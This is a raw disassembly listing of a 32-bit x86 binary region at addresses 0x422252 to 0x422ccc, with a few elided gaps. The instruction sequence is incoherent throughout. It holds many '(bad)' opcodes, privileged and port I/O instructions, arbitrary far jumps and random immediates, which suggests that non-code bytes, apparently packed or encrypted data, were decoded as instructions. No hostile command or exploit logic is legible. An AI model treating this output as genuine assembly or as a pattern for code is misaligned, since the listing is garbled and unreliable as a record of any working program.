  422252:	test   eax,0xfcd6c937
  422257:	push   ebx
  422258:	cmp    BYTE PTR fs:[esi-0x73],ah
  42225c:	lahf   
  42225d:	jge    0x4222ca
  42225f:	adc    eax,0xdef1d36a
  422264:	push   cs
  422265:	scas   al,BYTE PTR es:[edi]
  422266:	rcr    BYTE PTR [ebp-0x723d400f],1
  42226c:	and    BYTE PTR [ebp-0x4a],ch
  42226f:	xchg   esi,eax
  422270:	mov    al,ds:0xc3af5208
  422275:	jmp    0x4222af
  422277:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  422279:	jbe    0x4222ae
  42227b:	inc    esi
  42227c:	retf   0xbadf
  42227f:	pop    ebp
  422280:	clc    
  422281:	xor    BYTE PTR ds:0xba7c0ca8,cl
  422287:	ja     0x4222e4
  422289:	retf   0x5b25
  42228c:	mov    ds:0xca6bd4,eax
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	sub    al,0x58
  422302:	lahf   
  422303:	or     BYTE PTR [esp+ebp*2],bh
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	(bad)  
  42230d:	jl     0x422309
  42230f:	(bad)  
  422310:	mov    DWORD PTR [edx-0x12],esp
  422313:	adc    DWORD PTR [esi-0xd12bf3d],0x5
  42231a:	dec    edx
  42231b:	inc    eax
  42231c:	push   cs
  42231d:	mov    al,0xf6
  42231f:	jge    0x4222b7
  422321:	fnsetpm(287 only) 
  422323:	ja     0x422338
  422325:	hlt    
  422326:	(bad)  
  422327:	nop
  422328:	lahf   
  422329:	lahf   
  42232a:	xchg   esi,eax
  42232b:	test   al,0x55
  42232d:	ss cmp ah,ch
  422330:	xchg   ebx,eax
  422331:	push   ds
  422332:	and    al,0x70
  422334:	push   ecx
  422335:	fwait
  422336:	adc    esp,0xb6170761
  42233c:	xchg   edx,eax
  42233d:	imul   DWORD PTR [ebx]
  42233f:	icebp  
  422340:	xor    al,0x9c
  422342:	or     BYTE PTR [edx-0x6a],bh
  422345:	push   ds
  422346:	pop    edx
  422347:	pop    edi
  422348:	das    
  422349:	int    0x43
  42234b:	adc    DWORD PTR [edx],0x369033ea
  422351:	lahf   
  422352:	aad    0x6e
  422354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422355:	mov    eax,ds:0x71c02e7c
  42235a:	mov    ch,0x3
  42235c:	inc    edx
  42235d:	mov    bl,al
  42235f:	iret   
  422360:	xchg   ebp,eax
  422361:	jmp    0xb3e2:0xe7cb08c0
  422368:	xchg   DWORD PTR ds:0xa13e08b7,esp
  42236e:	data16 in al,0x6
  422371:	(bad)  
  422373:	ror    eax,1
  422375:	or     dl,dl
  422377:	lods   al,BYTE PTR ds:[esi]
  422378:	push   0xfbe4451
  42237d:	xchg   esp,eax
  42237e:	cwde   
  42237f:	cmp    al,0x66
  422381:	(bad)  
  422382:	cmp    eax,0x74ed415b
  422387:	add    ah,BYTE PTR es:[ebx]
  42238a:	jbe    0x4223d7
  42238c:	and    ebp,DWORD PTR [eax+0x4b4ab6dd]
  422392:	mov    dh,bh
  422394:	jmp    0xb50e:0x7e137a89
  42239b:	je     0x42235c
  42239d:	test   DWORD PTR [edi+eax*8],ebp
  4223a0:	cmp    edi,DWORD PTR [esi]
  4223a2:	(bad)  
  4223a3:	xchg   esp,eax
  4223a4:	lock jge 0x4223b3
  4223a7:	outs   dx,BYTE PTR ds:[esi]
  4223a8:	adc    al,0xf5
  4223aa:	sub    BYTE PTR ds:0x6f1d8bd3,ah
  4223b0:	xchg   esp,eax
  4223b1:	loopne 0x422347
  4223b3:	repnz push 0xfffffff4
  4223b6:	mov    al,dh
  4223b8:	scas   al,BYTE PTR es:[edi]
  4223b9:	pop    ebx
  4223ba:	lods   al,BYTE PTR ds:[esi]
  4223bb:	fdiv   DWORD PTR [edi]
  4223bd:	add    esi,DWORD PTR [ecx+0x5293016f]
  4223c3:	aas    
  4223c4:	add    dh,dh
  4223c6:	pop    eax
  4223c7:	sub    BYTE PTR ss:[ebx+0x33],dl
  4223cb:	push   esp
  4223cc:	push   esp
  4223cd:	dec    ebp
  4223ce:	and    BYTE PTR ds:0xe02f7530,0xbb
  4223d5:	setg   BYTE PTR [ebp-0x1a1fa050]
  4223dc:	shl    dl,0x5a
  4223df:	cmc    
  4223e0:	scas   eax,DWORD PTR es:[edi]
  4223e1:	aas    
  4223e2:	cs push eax
  4223e4:	pop    ebx
  4223e5:	mov    eax,0xd29b0088
  4223ea:	cmp    dh,BYTE PTR [eax+0x21]
  4223ed:	es (bad) 
  4223ef:	xor    al,0xad
  4223f1:	out    0xd5,eax
  4223f3:	cwde   
  4223f4:	into   
  4223f5:	jmp    0x71c:0xb4633334
  4223fc:	cdq    
  4223fd:	das    
  4223fe:	push   ebp
  4223ff:	shr    DWORD PTR [ebx+ebp*8+0x393ab7a3],cl
  422406:	ret    0xed59
  422409:	cdq    
  42240a:	and    DWORD PTR [ebp+0x6e],ecx
  42240d:	push   0xffffff90
  42240f:	dec    ebx
	...
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	aaa    
  422481:	jl     0x4224c8
  422483:	dec    ecx
  422484:	inc    eax
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	mov    eax,0x4d839710
  422491:	(bad)  
  422492:	mov    bh,0xfb
  422494:	jmp    0x42245c
  422496:	iret   
  422497:	sub    al,0x2d
  422499:	jle    0x4224e6
  42249b:	adc    DWORD PTR [ebp+0x79f7a79a],ecx
  4224a1:	outs   dx,BYTE PTR ds:[esi]
  4224a2:	cmc    
  4224a3:	dec    edx
  4224a4:	and    dh,BYTE PTR [edx]
  4224a6:	xchg   esi,eax
  4224a7:	xor    BYTE PTR [ebp+0x1d],ch
  4224aa:	pop    ss
  4224ab:	loope  0x422442
  4224ad:	xchg   dl,bl
  4224af:	stc    
  4224b0:	xor    al,0xa7
  4224b2:	xlat   BYTE PTR ds:[ebx]
  4224b3:	sub    ch,dh
  4224b5:	ficomp DWORD PTR [edx+0x39322adc]
  4224bb:	mov    esp,0x7b5f20bd
  4224c0:	bound  ecx,QWORD PTR [eax]
  4224c2:	lea    ecx,[ebp-0x2]
  4224c5:	lock repz mov ds:0x8637907c,al
  4224cc:	or     cl,BYTE PTR [ebp+0x63]
  4224cf:	cdq    
  4224d0:	adc    eax,0x8da140f3
  4224d5:	(bad)  
  4224d6:	in     eax,0x6b
  4224d8:	test   eax,0xb7fa3dce
  4224dd:	cld    
  4224de:	ret    
  4224df:	and    BYTE PTR [edi-0x4c81a2b3],al
  4224e5:	ins    BYTE PTR es:[edi],dx
  4224e6:	add    al,0x49
  4224e8:	inc    edx
  4224e9:	pop    edx
  4224ea:	adc    ebx,edi
  4224ec:	push   cs
  4224ed:	cwde   
  4224ee:	or     ebx,0xed4e9121
  4224f4:	sub    eax,0x6f414bbf
  4224f9:	scas   al,BYTE PTR es:[edi]
  4224fa:	mov    esp,0x2f9aada4
  4224ff:	mov    esp,0x99a17ef1
  422504:	out    0xb7,al
  422506:	push   edx
  422507:	in     al,0xad
  422509:	cwde   
  42250a:	ret    0x43e3
  42250d:	xchg   esi,eax
  42250e:	mov    dh,0xf2
  422510:	arpl   WORD PTR [edx],cx
  422512:	ss retf 
  422514:	mov    ah,bh
  422516:	cdq    
  422517:	or     eax,0xf1d47b3f
  42251c:	dec    ebp
  42251d:	call   0xb6338422
  422522:	inc    ebp
  422523:	push   edi
  422524:	mov    eax,cs:0x832b79af
  42252a:	ss mov ebx,0xf6f9c9c9
  422530:	sbb    BYTE PTR [ecx+0x50],ch
  422533:	sbb    edx,esi
  422535:	or     dl,BYTE PTR [edi-0x5]
  422538:	scas   eax,DWORD PTR es:[edi]
  422539:	(bad)  
  42253a:	or     ecx,DWORD PTR [ebx+ecx*8]
  42253d:	lds    esp,FWORD PTR [ecx-0x51]
  422540:	outs   dx,BYTE PTR ds:[esi]
  422541:	mov    BYTE PTR [ecx+0x65321b68],dl
  422547:	mov    edx,0xde4a0444
  42254c:	test   BYTE PTR [esp+ebp*4],ah
  42254f:	(bad)  
  422550:	in     al,0x10
  422552:	dec    ebp
  422553:	push   esp
  422554:	sbb    ch,bh
  422556:	inc    eax
  422557:	mov    BYTE PTR [edi-0x50],bl
  42255a:	jb     0x422513
  42255c:	or     BYTE PTR [edx+0xe697263],ah
  422562:	fiadd  WORD PTR [ebp-0x55]
  422565:	sbb    BYTE PTR [ebx],ah
  422567:	mov    al,ds:0x506ca67b
  42256c:	xchg   BYTE PTR [ebp+0x5e10f3e4],dh
  422572:	dec    ebx
  422573:	add    BYTE PTR [ebx+0x19a5b700],ah
  422579:	stos   BYTE PTR es:[edi],al
  42257a:	mov    WORD PTR [ecx-0x4386d2fb],gs
  422580:	(bad)  
  422581:	aam    0x1d
  422583:	loopne 0x4225b4
  422585:	add    ch,BYTE PTR ds:0x33f780ba
  42258b:	push   0xadf7a1ed
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0xb6fa2f8]
  422602:	jo     0x422599
  422604:	inc    esp
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    al,0x1
  42260a:	add    BYTE PTR [eax],al
  42260c:	retf   0xff1e
  42260f:	jbe    0x422625
  422611:	mov    eax,ds:0xbc8db387
  422616:	sbb    esi,DWORD PTR [ecx-0x80]
  422619:	mov    BYTE PTR gs:[ebx-0x5bbbcd6a],al
  422620:	arpl   WORD PTR [edi],si
  422622:	jmp    0x3b9f63b6
  422627:	sbb    eax,0x20d46d55
  42262c:	ficom  DWORD PTR [esi]
  42262e:	jecxz  0x42260e
  422630:	mul    BYTE PTR [edi+0x5]
  422633:	mov    al,ds:0xe8b36bf0
  422638:	lock mov dh,0xd0
  42263b:	(bad)  
  42263d:	mov    al,0x83
  42263f:	push   0x37ab1df7
  422644:	repz icebp 
  422646:	inc    ecx
  422647:	lods   al,BYTE PTR ds:[esi]
  422648:	mov    esp,0x5ef17468
  42264d:	cmp    ah,BYTE PTR [ebx-0x27a712a9]
  422653:	test   al,0x4c
  422655:	ror    BYTE PTR [edi+0x5899fe84],cl
  42265b:	add    BYTE PTR [ebp-0x625c64ce],cl
  422661:	sbb    al,0x8a
  422663:	sub    esp,DWORD PTR [eax-0x5e]
  422666:	jb     0x42266c
  422668:	xor    eax,0x1400adbd
  42266d:	add    bl,cl
  42266f:	(bad)  [ecx-0x12]
  422672:	xor    esi,DWORD PTR [edi]
  422674:	ret    0xcb44
  422677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422678:	pusha  
  422679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42267a:	mov    ds:0xb50b8e93,al
  42267f:	adc    eax,0x2289bb69
  422684:	cmp    al,0x99
  422686:	jmp    0x2c4f18ae
  42268b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42268c:	clc    
  42268d:	idiv   BYTE PTR [edx-0x1f]
  422690:	dec    eax
  422691:	xchg   edx,eax
  422692:	mov    al,ds:0x2f404b7f
  422697:	not    BYTE PTR [ebp-0xfb8ea74]
  42269d:	adc    DWORD PTR [edi+0x24],ebp
  4226a0:	xchg   ebx,eax
  4226a1:	scas   al,BYTE PTR es:[edi]
  4226a2:	fild   QWORD PTR [esi]
  4226a4:	jle    0x422702
  4226a6:	jg     0x4226ed
  4226a8:	cmp    bh,BYTE PTR [edx]
  4226aa:	not    BYTE PTR [ebx+0x29]
  4226ad:	cmp    DWORD PTR [ebx],0x30
  4226b0:	mov    ebx,0x5faf51ed
  4226b5:	retf   0xe0c9
  4226b8:	into   
  4226b9:	popf   
  4226ba:	pop    esp
  4226bb:	sbb    DWORD PTR [edx+ebx*2],ebp
  4226be:	fwait
  4226bf:	ror    BYTE PTR [edi+eiz*2-0x507ad7f0],cl
  4226c6:	test   eax,0x88df1a10
  4226cb:	mov    ch,0x45
  4226cd:	or     al,0x5f
  4226cf:	div    DWORD PTR [edi-0x4e]
  4226d2:	ss pop ecx
  4226d4:	mov    esi,0x935de62e
  4226d9:	mov    BYTE PTR [ebx+0x784eeed7],ch
  4226df:	mov    esp,DWORD PTR [esi-0x17191c18]
  4226e5:	xchg   ebp,eax
  4226e6:	pop    esi
  4226e7:	mov    eax,eax
  4226e9:	imul   dh
  4226eb:	shr    BYTE PTR [ebx-0x2b],cl
  4226ee:	call   0x426:0x56ec6aa5
  4226f5:	arpl   WORD PTR [edi-0x62563206],bp
  4226fb:	mov    eax,ds:0x33e34ebd
  422700:	out    dx,al
  422701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422702:	and    edx,esp
  422704:	add    BYTE PTR [eax+ecx*1+0x5],0xb8
  422709:	mov    BYTE PTR [esi+0x61],ah
  42270c:	push   esp
  42270d:	sub    eax,0x6820
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x327f01c8
  422781:	cmp    eax,0x6f48bb34
  422786:	add    DWORD PTR [eax],eax
  422788:	add    al,0x1
  42278a:	add    BYTE PTR [eax],al
  42278c:	and    DWORD PTR [edi+0x70],esi
  42278f:	out    dx,eax
  422790:	repz xor ch,BYTE PTR [eax]
  422793:	pop    edi
  422794:	mov    al,0xfc
  422796:	add    WORD PTR [ecx+eiz*2+0x16a85cdd],bx
  42279e:	or     eax,0xfc8c619f
  4227a3:	jmp    0x7d9d:0xe6be7de2
  4227aa:	jnp    0x4227ad
  4227ac:	push   ebp
  4227ad:	stos   DWORD PTR es:[edi],eax
  4227ae:	(bad)  
  4227af:	leave  
  4227b0:	inc    ebx
  4227b1:	sbb    al,0x96
  4227b3:	shr    BYTE PTR [edi+0x36],cl
  4227b6:	jne    0x42276a
  4227b8:	sbb    DWORD PTR [eax+edx*1-0x3a],ebx
  4227bc:	ror    DWORD PTR [eax-0x55586c3d],1
  4227c2:	cwde   
  4227c3:	and    ebp,DWORD PTR [ebp-0x3253edff]
  4227c9:	adc    ah,BYTE PTR [ebp+0x2ff7e64c]
  4227cf:	(bad)  
  4227d0:	sbb    al,0x74
  4227d2:	sub    al,0x61
  4227d4:	test   eax,0xe8c11f98
  4227d9:	lods   al,BYTE PTR ds:[esi]
  4227da:	jb     0x4227ef
  4227dc:	(bad)  
  4227dd:	mov    al,ds:0xbf9e2a2d
  4227e2:	imul   DWORD PTR [eax+0x5b82a4e0]
  4227e8:	int3   
  4227e9:	xlat   BYTE PTR ds:[ebx]
  4227ea:	inc    ebx
  4227eb:	fmul   DWORD PTR [edx]
  4227ed:	add    al,0xc6
  4227ef:	and    ah,dh
  4227f1:	mov    al,0xd6
  4227f3:	in     al,0x29
  4227f5:	add    ecx,DWORD PTR [ebx+0x465b323e]
  4227fb:	mov    al,ds:0xf928bd29
  422800:	retf   
  422801:	scas   al,BYTE PTR es:[edi]
  422802:	aas    
  422803:	out    0x14,al
  422805:	xor    al,0x3b
  422807:	sub    al,0xe5
  422809:	retf   
  42280a:	int3   
  42280b:	sub    bl,BYTE PTR [edx-0xa]
  42280e:	adc    DWORD PTR [ecx],edi
  422810:	mov    cl,0x95
  422812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422813:	sti    
  422814:	pop    ss
  422815:	cmp    cl,dl
  422817:	add    eax,0x7ad7400
  42281c:	cmp    eax,0xf115070a
  422821:	jbe    0x4227c6
  422823:	sub    eax,0xd61ba3b8
  422828:	or     bh,BYTE PTR [eax-0x66]
  42282b:	in     al,dx
  42282c:	sub    edi,DWORD PTR [eax+0x41e4562]
  422832:	pop    ebx
  422833:	(bad)  
  422834:	ja     0x42281b
  422836:	dec    ebp
  422837:	loop   0x422825
  422839:	mov    cl,0xc9
  42283b:	mov    esp,0x9df7bfab
  422840:	cli    
  422841:	mov    ebx,0x4242016f
  422846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422847:	dec    edx
  422848:	iret   
  422849:	retf   
  42284a:	(bad)  
  42284b:	jae    0x4228b4
  42284d:	or     DWORD PTR [esi+esi*8+0x3f],esp
  422851:	jo     0x422810
  422853:	dec    edi
  422854:	jns    0x422831
  422856:	or     al,0x58
  422858:	push   ecx
  422859:	or     al,0x66
  42285b:	and    al,dl
  42285d:	fwait
  42285e:	sbb    eax,0x29b3b7f5
  422863:	call   FWORD PTR ds:0xd1eb79dc
  422869:	cmp    edi,DWORD PTR [edx]
  42286b:	adc    eax,0xdf3b807d
  422870:	sbb    DWORD PTR [edx+edi*2],ebp
  422873:	push   ds
  422874:	data16 daa 
  422876:	gs jno 0x4228a0
  422879:	inc    edi
  42287a:	cwde   
  42287b:	mov    esi,0x650119de
  422880:	adc    al,0x77
  422882:	sbb    DWORD PTR [eax],0xffffffed
  422885:	neg    dh
  422887:	add    ch,dl
  422889:	fwait
  42288a:	aas    
  42288b:	cmp    bl,BYTE PTR [edi+0xb8225a]
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x4228b8
  422901:	dec    ecx
  422902:	mov    ebp,0x1704c60
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	xchg   edi,eax
  42290d:	inc    DWORD PTR [eax+esi*1+0x32]
  422911:	mov    ebx,0x8936f22b
  422916:	pop    edx
  422917:	popf   
  422918:	mov    bl,0xa3
  42291a:	xchg   esp,eax
  42291b:	inc    esi
  42291c:	stc    
  42291d:	hlt    
  42291e:	js     0x4228c0
  422920:	sbb    DWORD PTR [ebx-0x30],eax
  422923:	retf   0x9b96
  422926:	enter  0x8ea0,0xeb
  42292a:	adc    ebx,DWORD PTR [ecx]
  42292c:	mov    al,0x2d
  42292e:	hlt    
  42292f:	jmp    0x4228b7
  422931:	aas    
  422932:	jb     0x4228fa
  422934:	fwait
  422935:	aad    0x3a
  422937:	cmp    DWORD PTR [edi-0x77],edi
  42293a:	ret    0x6f17
  42293d:	(bad)  
  42293e:	cli    
  42293f:	cmp    DWORD PTR [ebx-0x2f],edx
  422942:	fs fdivp st(1),st
  422945:	xor    BYTE PTR ds:0xff3b3470,bh
  42294b:	mov    edx,0x9a5640b2
  422950:	imul   edx,DWORD PTR [esi],0x140c44b6
  422956:	push   cs
  422957:	mov    edi,ds
  422959:	adc    al,0xe0
  42295b:	out    0xb5,al
  42295d:	dec    ebx
  42295e:	pop    esp
  42295f:	sbb    cl,bl
  422961:	call   FWORD PTR [edi+0x6a10ae6f]
  422967:	jb     0x4228fb
  422969:	mov    DWORD PTR [ecx-0x52],edi
  42296c:	mov    ebp,0x8a3f81e3
  422971:	xchg   esp,eax
  422972:	and    al,0xe
  422974:	sar    DWORD PTR [esi-0x14405a13],cl
  42297a:	rcl    dl,cl
  42297c:	popf   
  42297d:	xchg   ecx,eax
  42297e:	adc    BYTE PTR [ebp+0x7746a33a],bh
  422984:	jnp    0x4229af
  422986:	cmp    ah,cl
  422988:	pop    ss
  422989:	scas   eax,DWORD PTR es:[edi]
  42298a:	cdq    
  42298b:	add    BYTE PTR [edi-0x47],al
  42298e:	push   ebx
  42298f:	adc    esp,DWORD PTR [esi-0xeee2851]
  422995:	out    dx,eax
  422996:	repz lea edi,ds:[edx]
  42299a:	sub    bl,BYTE PTR [edx-0x6c]
  42299d:	std    
  42299e:	sub    DWORD PTR [edi],0x4e604863
  4229a4:	popf   
  4229a5:	xor    DWORD PTR [edx+0x50],edx
  4229a8:	pop    ebp
  4229a9:	out    0x84,eax
  4229ab:	lods   al,BYTE PTR ds:[esi]
  4229ac:	ins    DWORD PTR es:[edi],dx
  4229ad:	fcmovne st,st(6)
  4229af:	xlat   BYTE PTR ds:[ebx]
  4229b0:	or     eax,0xf0714121
  4229b5:	fadd   st,st(2)
  4229b7:	mov    al,ds:0xaed1ef42
  4229bc:	adc    al,0x45
  4229be:	cs inc esi
  4229c0:	jg     0x4229da
  4229c2:	ds xchg ecx,eax
  4229c4:	sbb    al,0x93
  4229c6:	mov    esp,0x9997cd2b
  4229cb:	pop    esp
  4229cc:	and    DWORD PTR [edi],edx
  4229ce:	std    
  4229cf:	out    0x10,eax
  4229d1:	or     bh,BYTE PTR [ebx]
  4229d3:	sbb    al,0x10
  4229d5:	inc    esp
  4229d6:	cli    
  4229d7:	(bad)  
  4229d8:	sub    cl,BYTE PTR [ebx+0x6a]
  4229db:	int3   
  4229dc:	mov    ds:0xbd1e7b7f,al
  4229e1:	ds jbe 0x422999
  4229e4:	mov    edx,0xc41a8d8c
  4229e9:	sbb    al,0x60
  4229eb:	test   eax,0x1ac5bd23
  4229f0:	add    al,0x99
  4229f2:	pusha  
  4229f3:	js     0x422a52
  4229f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229f6:	xor    DWORD PTR [ecx-0x10],edi
  4229f9:	pushf  
  4229fa:	adc    BYTE PTR [esp+ebx*8+0x17124d67],dh
  422a01:	(bad)  
  422a02:	out    0x43,eax
  422a04:	iret   
  422a05:	bound  esp,QWORD PTR [ebx+0x22]
  422a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a09:	das    
  422a0a:	call   0xcdfc23dd
  422a0f:	inc    edx
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a81:	shl    DWORD PTR [ebp+0x17150e8],1
  422a87:	add    BYTE PTR [ecx+eax*1],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	sbb    bl,BYTE PTR [edx]
  422a8e:	adc    al,0x64
  422a90:	pop    esi
  422a91:	rcl    BYTE PTR [eax+0x3c8c9c63],cl
  422a97:	ja     0x422ade
  422a99:	addr16 mov ebp,0x98248dc4
  422a9f:	call   0x88603bc5
  422aa4:	pusha  
  422aa5:	call   0x2689049f
  422aaa:	fadd   QWORD PTR [eax]
  422aac:	iret   
  422aad:	std    
  422aae:	leave  
  422aaf:	jno    0x422a46
  422ab1:	push   ss
  422ab2:	jl     0x422acc
  422ab4:	leave  
  422ab5:	ret    0x2104
  422ab8:	lahf   
  422ab9:	pop    ecx
  422aba:	fs lahf 
  422abc:	lods   eax,DWORD PTR ds:[esi]
  422abd:	ds pop ds
  422abf:	push   0x25c94de6
  422ac4:	jbe    0x422af6
  422ac6:	inc    ecx
  422ac7:	sbb    al,0x48
  422ac9:	jo     0x422abc
  422acb:	stc    
  422acc:	pop    eax
  422acd:	in     eax,dx
  422ace:	adc    eax,0x960c1ee7
  422ad3:	xchg   esp,eax
  422ad4:	jp     0x422b3f
  422ad6:	ror    ch,cl
  422ad8:	popa   
  422ad9:	inc    ebp
  422ada:	(bad)  
  422adb:	mov    al,ds:0xe3d577a8
  422ae0:	test   al,0x87
  422ae2:	inc    ebp
  422ae3:	or     DWORD PTR [ebx+0x330a67c4],edx
  422ae9:	stos   BYTE PTR es:[edi],al
  422aea:	push   cs
  422aeb:	or     DWORD PTR [ecx],0xffffffbf
  422aee:	inc    edi
  422aef:	pop    ss
  422af0:	mov    cl,0xf9
  422af2:	and    al,0x46
  422af4:	sub    eax,0x4ab498c1
  422af9:	retf   
  422afa:	mov    dl,0x97
  422afc:	cmp    ah,BYTE PTR [ecx-0x67a5424b]
  422b02:	push   ss
  422b03:	imul   ebx,DWORD PTR [eax-0x39],0xd7aa2f
  422b0a:	fild   QWORD PTR [ebp-0x41]
  422b0d:	ficom  WORD PTR [ebx+0x70]
  422b10:	or     DWORD PTR [edi-0x291af475],eax
  422b16:	and    BYTE PTR [ebx+0xa],dh
  422b19:	in     eax,0x79
  422b1b:	aaa    
  422b1c:	les    ebx,FWORD PTR [esi+0x52]
  422b1f:	inc    ebp
  422b20:	add    bh,BYTE PTR [ebx]
  422b22:	xchg   bh,ah
  422b24:	pop    ebx
  422b25:	xchg   esi,eax
  422b26:	dec    ebp
  422b27:	push   ss
  422b28:	dec    esp
  422b29:	jle    0x422b2e
  422b2b:	aaa    
  422b2c:	push   0x51
  422b2e:	jne    0x422b33
  422b30:	mov    edi,0x371c4b18
  422b35:	enter  0xb278,0x55
  422b39:	mov    esp,0x8731c6b8
  422b3f:	add    BYTE PTR [edx],ch
  422b41:	imul   esi,eax,0x4a
  422b44:	adc    eax,0x2c5aeb11
  422b49:	inc    edi
  422b4a:	push   edx
  422b4b:	mov    al,ds:0x6125b33
  422b50:	xchg   BYTE PTR ds:0x84f2dfcd,ch
  422b56:	mov    BYTE PTR [ebx+0x2aca9d52],bl
  422b5c:	lods   eax,DWORD PTR ds:[esi]
  422b5d:	mov    ebx,0x61eaa613
  422b62:	cmp    DWORD PTR [eax],0xffffffc7
  422b65:	xor    cl,BYTE PTR [esi-0x4d]
  422b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b69:	pop    edi
  422b6a:	sar    edi,1
  422b6c:	or     ecx,esi
  422b6e:	sbb    al,0xa2
  422b70:	clc    
  422b71:	fs cli 
  422b73:	popa   
  422b74:	dec    eax
  422b75:	sub    DWORD PTR [edi+0x36b9035],ecx
  422b7b:	fs inc ecx
  422b7d:	inc    ebp
  422b7e:	mov    eax,edx
  422b80:	mov    DWORD PTR [eax],edi
  422b82:	call   0xc507:0x8c19e5d2
  422b89:	mov    ah,0x0
  422b8b:	iret   
  422b8c:	and    BYTE PTR [ecx],bl
  422b8e:	sub    BYTE PTR [edi+0x0],cl
	...
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x41154d9c]
  422c02:	xor    bh,BYTE PTR [ebx]
  422c04:	push   esp
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	es clc 
  422c0e:	iret   
  422c0f:	jbe    0x422c1a
  422c11:	cmp    al,0x17
  422c13:	sbb    ebx,ebx
  422c15:	fcom   DWORD PTR [ebp+0x7a]
  422c18:	test   eax,0x29f7f93a
  422c1d:	mov    ds:0x2dd790a0,eax
  422c22:	xchg   esi,eax
  422c23:	or     ah,BYTE PTR [ebp-0x7c]
  422c26:	hlt    
  422c27:	mov    bl,0x6c
  422c29:	nop
  422c2a:	ins    DWORD PTR es:[edi],dx
  422c2b:	xchg   esp,eax
  422c2c:	aam    0x98
  422c2e:	mov    dl,0xb7
  422c30:	jmp    0xcc4f1998
  422c35:	cli    
  422c36:	stos   DWORD PTR es:[edi],eax
  422c37:	fs adc al,0xf4
  422c3a:	sbb    al,0x5a
  422c3c:	jp     0x422c03
  422c3e:	faddp  st(0),st
  422c40:	mov    ebp,0x81428672
  422c45:	jbe    0x422c46
  422c47:	lods   eax,DWORD PTR ds:[esi]
  422c48:	or     ebx,DWORD PTR [edi]
  422c4a:	push   edi
  422c4b:	ins    DWORD PTR es:[edi],dx
  422c4c:	fdiv   QWORD PTR [eax]
  422c4e:	addr16 mov dh,0x30
  422c51:	xor    eax,0x5ebc89fa
  422c56:	out    0x8a,eax
  422c58:	bound  eax,QWORD PTR [esi-0x76]
  422c5b:	dec    edx
  422c5c:	call   0x225daa4d
  422c61:	imul   ecx,DWORD PTR [edx+0x35ea3287],0xfffffff5
  422c68:	adc    edx,edi
  422c6a:	pusha  
  422c6b:	mov    ds:0xcb71bdb4,eax
  422c70:	js     0x422ce7
  422c72:	rol    BYTE PTR [ebx-0x52ee6d63],cl
  422c78:	sub    DWORD PTR [edi+0x7e29438a],esp
  422c7e:	add    edx,DWORD PTR [esi+0x54aea107]
  422c84:	mov    ebp,ebx
  422c86:	mov    al,0xfd
  422c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c89:	push   esi
  422c8a:	ds (bad) 
  422c8c:	iret   
  422c8d:	ds and al,0x5e
  422c90:	adc    al,0xaf
  422c92:	aad    0xf7
  422c94:	stos   BYTE PTR es:[edi],al
  422c95:	xor    eax,DWORD PTR [edi]
  422c97:	retf   0x727c
  422c9a:	cmp    eax,0x886bff26
  422c9f:	pop    ecx
  422ca0:	sti    
  422ca1:	xor    ecx,ebx
  422ca3:	retf   
  422ca4:	scas   eax,DWORD PTR es:[edi]
  422ca5:	jle    0x422c81
  422ca7:	push   ds
  422ca8:	outs   dx,DWORD PTR ds:[esi]
  422ca9:	pop    ds
  422caa:	lods   eax,DWORD PTR ds:[esi]
  422cab:	jb     0x422d2c
  422cad:	sahf   
  422cae:	mov    ebx,0x38883747
  422cb3:	jbe    0x422c45
  422cb5:	imul   eax,DWORD PTR [edi-0x7650122d],0x3cf886
  422cbf:	iret   
  422cc0:	ds (bad) 
  422cc2:	push   edx
  422cc3:	jne    0x422c81
  422cc5:	push   edx
  422cc6:	xchg   DWORD PTR [ecx-0x1fa169c9],ebx
  422ccc:	ds inc esp
